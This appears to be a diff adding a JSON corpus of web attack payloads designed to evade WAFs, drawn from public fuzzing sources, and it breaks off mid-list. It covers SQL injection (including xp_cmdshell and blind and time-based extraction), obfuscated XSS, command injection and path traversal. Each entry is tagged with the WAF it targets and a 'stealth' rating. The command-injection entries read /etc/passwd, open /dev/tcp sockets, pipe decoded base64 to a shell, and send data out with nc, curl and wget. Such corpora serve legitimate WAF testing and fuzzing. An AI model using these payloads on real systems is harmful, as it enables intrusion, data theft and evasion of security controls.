@@ -1,0 +1,2931 @@
+{
+  "sources": [
+    "SecLists Fuzzing directory",
+    "PayloadsAllTheThings WAF bypass sections",
+    "OWASP WAF bypass cheat sheets",
+    "PortSwigger Web Security Academy"
+  ],
+  "payloads": {
+    "SqlInjection": [
+      {
+        "raw": "' OR/**/1=1--",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "comment_insertion",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "' OR/**/1=1#",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "comment_insertion",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "admin'/**/OR/**/1=1--",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "comment_insertion",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "' UNION/**/SELECT/**/NULL,NULL--",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "comment_insertion",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "1' AND/**/(SELECT/**/1)=1--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "comment_insertion",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "' oR 1=1--",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "case_variation",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "' UnIoN SeLeCt NULL--",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "case_variation",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "' uNiOn aLl sElEcT 1,2,3--",
+        "waf_targets": [
+          "cloudflare"
+        ],
+        "technique": "case_variation",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "%2527%2520OR%25201%253D1--",
+        "waf_targets": [
+          "generic",
+          "aws_waf",
+          "imperva"
+        ],
+        "technique": "double_url_encode",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%2527%2520UNION%2520SELECT%2520NULL--",
+        "waf_targets": [
+          "aws_waf",
+          "imperva"
+        ],
+        "technique": "double_url_encode",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%252f%252a%252a%252f",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "double_url_encode",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "' OR\t1=1--",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "whitespace_variation",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "'\tUNION\tSELECT\tNULL--",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "whitespace_variation",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "' OR\n1=1--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "whitespace_variation",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "' OR%0a1=1--",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "whitespace_variation",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "' OR%0b1=1--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "whitespace_variation",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "CONCAT('sel','ect') FROM dual",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "concat_splitting",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "' OR 'a'||'b'='ab'--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "concat_splitting",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "' OR CHAR(49)=CHAR(49)--",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "char_encoding",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "' OR CHR(49)=CHR(49)--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "char_encoding",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "' AND 1=1 AND 'a'='a",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "tautology",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "' AND SUBSTRING(@@version,1,1)='5",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "blind_extraction",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "blind_extraction",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "' AND IF(1=1,SLEEP(5),0)--",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "time_based",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "'; WAITFOR DELAY '0:0:5'--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "time_based",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "' AND pg_sleep(5)--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "time_based",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "1;SELECT/**/CASE/**/WHEN(1=1)THEN/**/pg_sleep(5)END--",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "time_based",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "' /*!50000OR*/ 1=1--",
+        "waf_targets": [
+          "modsecurity",
+          "generic"
+        ],
+        "technique": "mysql_version_comment",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "' /*!UNION*/ /*!SELECT*/ 1,2,3--",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "mysql_version_comment",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "0x27204f5220313d312d2d",
+        "waf_targets": [
+          "generic",
+          "aws_waf"
+        ],
+        "technique": "hex_encoding",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "' OR 0x31=0x31--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "hex_encoding",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "' OR 1 LIKE 1--",
+        "waf_targets": [
+          "cloudflare",
+          "generic"
+        ],
+        "technique": "operator_substitution",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "' OR 1 BETWEEN 0 AND 2--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "operator_substitution",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "' OR 1 IN (1)--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "operator_substitution",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "' OR 1 REGEXP 1--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "operator_substitution",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "-1' UNION SELECT 1,2,3--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "negative_id",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "0' UNION SELECT 1,2,3--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "false_union",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "' UNION ALL SELECT NULL,NULL,NULL FROM dual--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "dual_table",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "'+OR+'1'='1",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "plus_encoding",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "' OR 1=1 LIMIT 1 OFFSET 0--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "limit_clause",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "') OR ('1'='1",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "parenthesis_balance",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "')) OR (('1'='1",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "parenthesis_balance",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "' ORDER BY 1--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "order_by_probe",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "' GROUP BY 1--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "group_by_probe",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "' HAVING 1=1--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "having_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "1 AND (SELECT * FROM (SELECT(SLEEP(5)))a)--",
+        "waf_targets": [
+          "modsecurity",
+          "cloudflare"
+        ],
+        "technique": "nested_select_sleep",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "error_based_xml",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "' AND UPDATEXML(1,CONCAT(0x7e,version()),1)--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "error_based_xml",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "';EXEC master..xp_cmdshell 'whoami'--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "stacked_query",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "' UNION SELECT table_name,NULL FROM information_schema.tables WHERE table_schema=database()--",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "schema_enumeration",
+        "stealth_rating": "medium"
+      }
+    ],
+    "CrossSiteScripting": [
+      {
+        "raw": "<svg/onload=alert(1)>",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "svg_event",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "<svg onload=alert`1`>",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "template_literal",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<img src=x onerror=alert(1)>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "img_error",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "<img/src=x onerror=alert(1)>",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "slash_separator",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
+        "waf_targets": [
+          "generic",
+          "cloudflare",
+          "aws_waf"
+        ],
+        "technique": "unicode_normalization",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "\\u003csvg/onload=alert(1)\\u003e",
+        "waf_targets": [
+          "cloudflare",
+          "aws_waf"
+        ],
+        "technique": "unicode_normalization",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "&#60;script&#62;alert(1)&#60;/script&#62;",
+        "waf_targets": [
+          "generic",
+          "imperva"
+        ],
+        "technique": "html_entity",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
+        "waf_targets": [
+          "generic",
+          "imperva"
+        ],
+        "technique": "hex_html_entity",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<math><mi>x</mi><annotation-xml encoding='text/html'><svg onload=alert(1)></annotation-xml></math>",
+        "waf_targets": [
+          "modsecurity",
+          "cloudflare"
+        ],
+        "technique": "mathml_bypass",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "mathml_style_bypass",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "javascript:alert(1)",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "javascript_uri",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "jaVasCriPt:alert(1)",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "case_variation",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "java%0ascript:alert(1)",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "newline_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "java%09script:alert(1)",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "tab_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<details open ontoggle=alert(1)>",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "html5_event",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<video src=x onerror=alert(1)>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "video_error",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<audio src=x onerror=alert(1)>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "audio_error",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<body onload=alert(1)>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "body_event",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "<marquee onstart=alert(1)>",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "marquee_event",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<input onfocus=alert(1) autofocus>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "autofocus_event",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<select onfocus=alert(1) autofocus>",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "select_autofocus",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<textarea onfocus=alert(1) autofocus>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "textarea_autofocus",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<isindex type=image src=x onerror=alert(1)>",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "deprecated_tag",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "'-alert(1)-'",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "expression_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "\\'-alert(1)//",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "escape_sequence",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "</script><script>alert(1)</script>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "tag_break",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "\"><script>alert(1)</script>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "attribute_break",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "'><script>alert(1)</script>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "attribute_break_single",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
+        "waf_targets": [
+          "modsecurity",
+          "cloudflare"
+        ],
+        "technique": "svg_animate",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "<svg><set onbegin=alert(1) attributeName=x to=y>",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "svg_set",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "%3Csvg%20onload%3Dalert(1)%3E",
+        "waf_targets": [
+          "generic",
+          "aws_waf"
+        ],
+        "technique": "url_encoding",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%253Csvg%2520onload%253Dalert(1)%253E",
+        "waf_targets": [
+          "aws_waf",
+          "imperva"
+        ],
+        "technique": "double_url_encode",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<svg/onload=alert(String.fromCharCode(49))>",
+        "waf_targets": [
+          "cloudflare",
+          "modsecurity"
+        ],
+        "technique": "char_code",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "<svg/onload=eval(atob('YWxlcnQoMSk='))>",
+        "waf_targets": [
+          "cloudflare",
+          "modsecurity"
+        ],
+        "technique": "base64_eval",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "<svg/onload=['ale'+'rt(1)'].map(eval)>",
+        "waf_targets": [
+          "cloudflare"
+        ],
+        "technique": "array_map_eval",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "<img src=x onerror=window['al'+'ert'](1)>",
+        "waf_targets": [
+          "cloudflare",
+          "modsecurity"
+        ],
+        "technique": "bracket_notation",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "<img src=x onerror=self['al'+'ert'](1)>",
+        "waf_targets": [
+          "cloudflare"
+        ],
+        "technique": "self_bracket",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "<img src=x onerror=top[8680439..toString(30)](1)>",
+        "waf_targets": [
+          "cloudflare",
+          "modsecurity"
+        ],
+        "technique": "number_base_conversion",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "{{constructor.constructor('alert(1)')()}}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "prototype_pollution",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "${alert(1)}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "template_literal_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<iframe srcdoc='<script>alert(1)</script>'>",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "iframe_srcdoc",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<object data='javascript:alert(1)'>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "object_data",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<embed src='javascript:alert(1)'>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "embed_src",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<a href=javascript:alert(1)>click</a>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "anchor_javascript",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "<form action=javascript:alert(1)><input type=submit>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "form_action",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<style>*{background:url('javascript:alert(1)')}</style>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "css_expression",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<div style=\"width:expression(alert(1))\">",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "css_expression_ie",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<meta http-equiv=refresh content='0;url=javascript:alert(1)'>",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "meta_refresh",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "<svg><use href='data:image/svg+xml,<svg onload=alert(1)>'/>",
+        "waf_targets": [
+          "modsecurity",
+          "cloudflare"
+        ],
+        "technique": "svg_use_data",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "<xss contenteditable onblur=alert(1)>lose focus</xss>",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "custom_tag_event",
+        "stealth_rating": "high"
+      }
+    ],
+    "CommandInjection": [
+      {
+        "raw": ";id",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "semicolon_chain",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "|id",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "pipe_chain",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "&&id",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "and_chain",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "||id",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "or_chain",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "`id`",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "backtick_substitution",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "$(id)",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "dollar_substitution",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": ";$IFS$9id",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "ifs_substitution",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": ";{id}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "brace_expansion",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": ";i\\d",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "backslash_insertion",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": ";i''d",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "empty_quote_insertion",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": ";i\"\"d",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "empty_dquote_insertion",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "a]&&id||b",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "bracket_escape",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": ";/???/??t /???/p??s??",
+        "waf_targets": [
+          "generic",
+          "modsecurity",
+          "cloudflare"
+        ],
+        "technique": "glob_wildcard",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": ";/???/??n/c?t /???/p??s??",
+        "waf_targets": [
+          "modsecurity",
+          "cloudflare"
+        ],
+        "technique": "glob_wildcard",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": ";$(printf '\\x69\\x64')",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "hex_printf",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": ";$(printf '\\151\\144')",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "octal_printf",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": ";echo$IFS'id'|$SHELL",
+        "waf_targets": [
+          "modsecurity",
+          "cloudflare"
+        ],
+        "technique": "ifs_shell_pipe",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": ";w]&&cat</etc/passwd||",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "redirect_read",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "\nid\n",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "newline_injection",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%0aid%0a",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "encoded_newline",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "a]%0a;id%0a[b",
+        "waf_targets": [
+          "cloudflare"
+        ],
+        "technique": "encoded_newline_bracket",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": ";id>/tmp/out;curl http://localhost/$(cat /tmp/out)",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "out_of_band",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": ";curl${IFS}http://localhost/?d=$(id|base64)",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "oob_base64",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": ";a]||wget${IFS}http://localhost/$(id)||[b",
+        "waf_targets": [
+          "modsecurity",
+          "cloudflare"
+        ],
+        "technique": "oob_wget",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "$((1+1))",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "arithmetic_expansion",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "%26%26id",
+        "waf_targets": [
+          "generic",
+          "aws_waf"
+        ],
+        "technique": "url_encoded_chain",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%7Cid",
+        "waf_targets": [
+          "generic",
+          "aws_waf"
+        ],
+        "technique": "url_encoded_pipe",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%3Bid",
+        "waf_targets": [
+          "generic",
+          "aws_waf"
+        ],
+        "technique": "url_encoded_semi",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": ";rev<<<'di'",
+        "waf_targets": [
+          "modsecurity",
+          "cloudflare"
+        ],
+        "technique": "reverse_string",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": ";$(rev<<<'di')",
+        "waf_targets": [
+          "modsecurity",
+          "cloudflare"
+        ],
+        "technique": "reverse_substitution",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": ";cat$IFS/et?/pas?wd",
+        "waf_targets": [
+          "modsecurity",
+          "cloudflare"
+        ],
+        "technique": "glob_read",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "ssti_rce",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "a]&&ping${IFS}-c${IFS}1${IFS}localhost||[b",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "ifs_ping",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": ";set /p x=< C:\\Windows\\win.ini",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "windows_read",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "&cmd /c dir",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "windows_chain",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "|powershell -c id",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "powershell_chain",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": ";bash -c '{echo,aWQ=}|{base64,-d}|bash'",
+        "waf_targets": [
+          "modsecurity",
+          "cloudflare"
+        ],
+        "technique": "brace_base64",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": ";exec 5<>/dev/tcp/localhost/80",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "bash_tcp",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": ";cat /etc/passwd | nc localhost 80",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "netcat_exfil",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "${PATH:0:1}etc${PATH:0:1}passwd",
+        "waf_targets": [
+          "modsecurity",
+          "cloudflare"
+        ],
+        "technique": "variable_slicing",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "$(tr '[:lower:]' '[:upper:]' <<< 'id')",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "tr_transform",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": ";echo id|sh",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "echo_pipe_sh",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": ";echo aWQ=|base64 -d|sh",
+        "waf_targets": [
+          "modsecurity",
+          "cloudflare"
+        ],
+        "technique": "base64_pipe",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": ";python3 -c 'import os;os.system(\"id\")'",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "python_system",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": ";perl -e 'system(\"id\")'",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "perl_system",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": ";ruby -e '`id`'",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "ruby_system",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": ";php -r 'system(\"id\");'",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "php_system",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": ";node -e 'require(\"child_process\").execSync(\"id\")'",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "node_exec",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": ";lua -e 'os.execute(\"id\")'",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "lua_system",
+        "stealth_rating": "medium"
+      }
+    ],
+    "PathTraversal": [
+      {
+        "raw": "../../../etc/passwd",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "basic_traversal",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "..\\..\\..\\windows\\win.ini",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "windows_traversal",
+        "stealth_rating": "low"
+      },
+      {
+        "raw": "....//....//....//etc/passwd",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "nested_traversal",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "..%2f..%2f..%2fetc%2fpasswd",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "url_encoded_slash",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "..%252f..%252f..%252fetc%252fpasswd",
+        "waf_targets": [
+          "aws_waf",
+          "imperva"
+        ],
+        "technique": "double_url_encode",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
+        "waf_targets": [
+          "generic",
+          "cloudflare"
+        ],
+        "technique": "full_url_encode",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "%252e%252e%252f%252e%252e%252fetc%252fpasswd",
+        "waf_targets": [
+          "aws_waf",
+          "imperva"
+        ],
+        "technique": "double_full_encode",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "..%c0%af..%c0%afetc/passwd",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "utf8_overlong",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "..%ef%bc%8f..%ef%bc%8fetc/passwd",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "unicode_fullwidth",
+        "stealth_rating": "high"
+      },
+      {
+        "raw": "../../../etc/passwd%00.jpg",
+        "waf_targets": [
+          "generic",
+          "modsecurity"
+        ],
+        "technique": "null_byte",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "../../../etc/passwd%00.png",
+        "waf_targets": [
+          "modsecurity"
+        ],
+        "technique": "null_byte",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "....\\\\....\\\\....\\\\etc\\\\passwd",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "double_backslash",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "..;/..;/..;/etc/passwd",
+        "waf_targets": [
+          "generic"
+        ],
+        "technique": "semicolon_insertion",
+        "stealth_rating": "medium"
+      },
+      {
+        "raw": "..%00/..%00/..%00/etc/passwd",
+        "waf_targets": [
+          "generic"
+        ],
